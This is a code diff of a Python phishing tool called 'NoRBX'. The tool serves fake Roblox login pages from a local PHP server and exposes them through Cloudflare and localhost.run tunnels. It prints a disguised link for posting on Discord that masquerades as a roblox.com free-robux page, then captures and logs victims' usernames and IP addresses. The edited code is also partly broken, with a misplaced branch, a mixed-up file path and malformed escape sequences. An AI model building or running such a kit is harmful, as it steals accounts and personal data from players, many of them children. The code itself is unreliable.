@@ -45,8 +45,8 @@ lhr_log = open(lhr_file, 'w')
 if os.path.isfile('server/cloudflared'):
    pass
 else:
-  print('\n\033[31m[!] Cloudflare is not installed.')
-  print('\n\033[35m[~] Installing cloudflare...')
+  print('\n\033[31m[Active Alert@NoRBX] Cloudflare is not installed.')
+  print('\n\033[35m[Info@NoRBX] Installing cloudflare...')
   os.system("bash modules/install.sh")
 
 def menu():
@@ -75,13 +75,13 @@ def menu():
 
 
   if num == 1:
-    Write.Print(('\n[~] Starting server...'), Colors.red_to_white, interval=0.0025)
+    Write.Print(('\n[Info@NoRBX] Starting server...'), Colors.red_to_white, interval=0.0025)
     print('')
     os.system("php -S localhost:8080 -t pages/roblox_fr > /dev/null 2>&1 &")
     time.sleep(2)
-    Write.Print(('[~] Server : ✔️'), Colors.red_to_white, interval=0.0025)
+    Write.Print(('[Info@NoRBX] Server : ✔️'), Colors.red_to_white, interval=0.0025)
     print('')
-    Write.Print(('[~] Creating links...'), Colors.red_to_white, interval=0.0025)
+    Write.Print(('[Info@NoRBX] Creating links...'), Colors.red_to_white, interval=0.0025)
     print('\n')
     bgtask("./server/cloudflared tunnel -url localhost:8080", stdout=cf_log, stderr=cf_log)
     bgtask("ssh -R 80:localhost:8080 nokey@localhost.run -T -n", stdout=lhr_log, stderr=lhr_log)
@@ -98,86 +98,92 @@ def menu():
             lhr_success = True
             break
         time.sleep(1)
-    Write.Print((f'[~] Link: {cf_url}'), Colors.red_to_white, interval=0.0025)
+    Write.Print((f'[Info@NoRBX] Link: {cf_url}'), Colors.red_to_white, interval=0.0025)
     print('')
-    Write.Print((f'\n[~] Localhost.run {lhr_url}'), Colors.red_to_white, interval=0.0025)
-    print('')
-
-    Write.Print((f'\n[~] CopyPaste for discord :\n[https://]({cf_url})[roblox.com/collabs/robux/]({cf_url})'), Colors.red_to_white, interval=0.0025)
+    Write.Print((f'\n[Info@NoRBX] Localhost.run {lhr_url}'), Colors.red_to_white, interval=0.0025)
     print('')
 
-    Write.Print(('\n[~] Waiting for data...'), Colors.red_to_white, interval=0.0025)
+    Write.Print((f'\n[Info@NoRBX] CopyPaste for discord :\n[https://]({cf_url})[roblox.com/collabs/robux/]({cf_url})'), Colors.red_to_white, interval=0.0025)
+    print('')
+
+    Write.Print(('\n[Info@NoRBX] Waiting for data...'), Colors.red_to_white, interval=0.0025)
     print('')
     while True:
-      if os.path.isfile('pages/roblox_fr/usuarios.txt'):
-        Write.Print(('\n\033[31m[!] Users found!'), Colors.red_to_white, interval=0.0025)
+      while True:
+       if os.path.isfile('pages/roblox_fr/usernames.txt'):
+        Write.Print(('\n\033[Active Alert@NoRBX] Users found!'), Colors.red_to_white, interval=0.0025)
         print('')
-        Write.Print(('\033[31m'), Colors.red_to_white, interval=0.0025)
+        Write.Print(('\033'), Colors.red_to_white, interval=0.0025)
         print('')
-        os.system("cat pages/roblox_fr/usuarios.txt")
-        os.system("cat pages/roblox_fr/usuarios.txt >> pages/roblox_fr/usuarios_guardados.txt")
-        os.system("rm -rf pages/roblox_fr/usuarios.txt")
-        Write.Print(('\n\033[34m[~] Users saved in: usuarios_guardados.txt'), Colors.red_to_white, interval=0.0025)
+        os.system("cat pages/roblox_fr/usernames.txt")
+        os.system("cat pages/roblox_fr/usernames.txt >> pages/roblox_fr/users_saved.txt")
+        os.system("rm -rf pages/roblox_fr/usernames.txt")
+        Write.Print(('\n\033[Passive Alert@NoRBX] Users saved in: users_saved.txt'), Colors.red_to_white, interval=0.0025)
         print('')
-      if os.path.isfile('pages/roblox_fr/ip.txt'):
-        Write.Print(('\n\033[31m[!] IP found!'), Colors.red_to_white, interval=0.0025)
+       if os.path.isfile('pages/roblox_fr/ip.txt'):
+        Write.Print(('\n\033[Active Alert@NoRBX] IP found!'), Colors.red_to_white, interval=0.0025)
         print('')
-        Write.Print(('\033[31m'), Colors.red_to_white, interval=0.0025)
+        Write.Print(('\033'), Colors.red_to_white, interval=0.0025)
         print('')
         os.system("cat pages/roblox_fr/ip.txt")
-        os.system("cat pages/roblox_fr/ip.txt >> pages/roblox_fr/ip_guardados.txt")
+        os.system("cat pages/roblox_en/ip.txt >> pages/roblox_fr/ip_saved.txt")
         os.system("rm -rf pages/roblox_fr/ip.txt")
-        Write.Print(('\n\033[34m[~] IP saved in: ip_guardados.txt'), Colors.red_to_white, interval=0.0025)
+        Write.Print(('\n\033[Passive Alert@NoRBX] IP saved in: ip_saved.txt'), Colors.red_to_white, interval=0.0025)
+        print('')
   elif num == 2:
-      Write.Print(('\n[~] Starting php server...'), Colors.red_to_white, interval=0.0025)
-      print('')
-      os.system("php -S localhost:8080 -t pages/roblox_en > /dev/null 2>&1 &")
-      time.sleep(2)
-      Write.Print(('[~] php server: ✔️'), Colors.red_to_white, interval=0.0025)
-      print('')
-      Write.Print(('[~] Creating links...'), Colors.red_to_white, interval=0.0025)
-      print('')
-      bgtask("./server/cloudflared tunnel -url localhost:8080", stdout=cf_log, stderr=cf_log)
-      bgtask("ssh -R 80:localhost:8080 nokey@localhost.run -T -n", stdout=lhr_log, stderr=lhr_log)
-      cf_success = False
-      for i in range(10):
-        cf_url = grep("(https://[-0-9a-z.]{4,}.trycloudflare.com)", cf_file)
-        if cf_url != "":
-            cf_success = True
-            break
-        time.sleep(1)
-      for i in range(10):
-        lhr_url = grep("(https://[-0-9a-z.]*.lhr.life)", lhr_file)
-        if lhr_url != "":
-            lhr_success = True
-            break
-        time.sleep(1)
-      Write.Print((f'[~] Link: {cf_url}'), Colors.red_to_white, interval=0.0025)
-      print('')
-      Write.Print((f'[~] Localhost.run: {lhr_url}'), Colors.red_to_white, interval=0.0025)
-      print('')
-      Write.Print(('\n[~] Waiting for data...'), Colors.red_to_white, interval=0.0025)
-      print('')
-      while True:
-       if os.path.isfile('pages/roblox_en/usernames.txt'):
-        Write.Print(('\n\033[31m[!] Users found!'), Colors.red_to_white, interval=0.0025)
+        Write.Print(('\n[Info@NoRBX] Starting server...'), Colors.red_to_white, interval=0.0025)
         print('')
-        Write.Print(('\033[31m'), Colors.red_to_white, interval=0.0025)
+        os.system("php -S localhost:8080 -t pages/roblox_en > /dev/null 2>&1 &")
+        time.sleep(2)
+        Write.Print(('[Info@NoRBX] Server : ✔️'), Colors.red_to_white, interval=0.0025)
         print('')
-        os.system("cat pages/roblox_en/usernames.txt")
-        os.system("cat pages/roblox_en/usernames.txt >> pages/roblox_en/users_saved.txt")
-        os.system("rm -rf pages/roblox_en/usernames.txt")
-        Write.Print(('\n\033[34m[~] Users saved in: users_saved.txt'), Colors.red_to_white, interval=0.0025)
+        Write.Print(('[Info@NoRBX] Creating links...'), Colors.red_to_white, interval=0.0025)
+        print('\n')
+        bgtask("./server/cloudflared tunnel -url localhost:8080", stdout=cf_log, stderr=cf_log)
+        bgtask("ssh -R 80:localhost:8080 nokey@localhost.run -T -n", stdout=lhr_log, stderr=lhr_log)
+        cf_success = False
+        for i in range(10):
+            cf_url = grep("(https://[-0-9a-z.]{4,}.trycloudflare.com)", cf_file)
+            if cf_url != "":
+                cf_success = True
+                break
+            time.sleep(1)
+        for i in range(10):
+            lhr_url = grep("(https://[-0-9a-z.]*.lhr.life)", lhr_file)
+            if lhr_url != "":
+                lhr_success = True
+                break
+            time.sleep(1)
+        Write.Print((f'[Info@NoRBX] Link: {cf_url}'), Colors.red_to_white, interval=0.0025)
         print('')
-       if os.path.isfile('pages/roblox_en/ip.txt'):
-        Write.Print(('\n\033[31m[!] IP found!'), Colors.red_to_white, interval=0.0025)
+        Write.Print((f'\n[Info@NoRBX] Localhost.run {lhr_url}'), Colors.red_to_white, interval=0.0025)
         print('')
-        Write.Print(('\033[31m'), Colors.red_to_white, interval=0.0025)
+
+        Write.Print((f'\n[Info@NoRBX] CopyPaste for discord :\n[https://]({cf_url})[roblox.com/collabs/robux/]({cf_url})'), Colors.red_to_white, interval=0.0025)
         print('')
-        os.system("cat pages/roblox_en/ip.txt")
-        os.system("cat pages/roblox_en/ip.txt >> pages/roblox_en/ip_saved.txt")
-        os.system("rm -rf pages/roblox_en/ip.txt")
-        Write.Print(('\n\033[34m[~] IP saved in: ip_saved.txt'), Colors.red_to_white, interval=0.0025)
+
+        Write.Print(('\n[Info@NoRBX] Waiting for data...'), Colors.red_to_white, interval=0.0025)
         print('')
+        while True:
+            if os.path.isfile('pages/roblox_en/usernames.txt'):
+                Write.Print(('\n\033[Active Alert@NoRBX] Users found!'), Colors.red_to_white, interval=0.0025)
+                print('')
+                Write.Print(('\033'), Colors.red_to_white, interval=0.0025)
+                print('')
+                os.system("cat pages/roblox_en/usernames.txt")
+                os.system("cat pages/roblox_en/usernames.txt >> pages/roblox_en/users_saved.txt")
+                os.system("rm -rf pages/roblox_en/usernames.txt")
+                Write.Print(('\n\033[Passive Alert@NoRBX] Users saved in: users_saved.txt'), Colors.red_to_white, interval=0.0025)
+                print('')
+            if os.path.isfile('pages/roblox_en/ip.txt'):
+                Write.Print(('\n\033[Active Alert@NoRBX] IP found!'), Colors.red_to_white, interval=0.0025)
+                print('')
+                Write.Print(('\033'), Colors.red_to_white, interval=0.0025)
+                print('')
+                os.system("cat pages/roblox_en/ip.txt")
+                os.system("cat pages/roblox_en/ip.txt >> pages/roblox_en/ip_saved.txt")
+                os.system("rm -rf pages/roblox_en/ip.txt")
+                Write.Print(('\n\033[Passive Alert@NoRBX] IP saved in: ip_saved.txt'), Colors.red_to_white, interval=0.0025)
+                print('')
 
 menu()
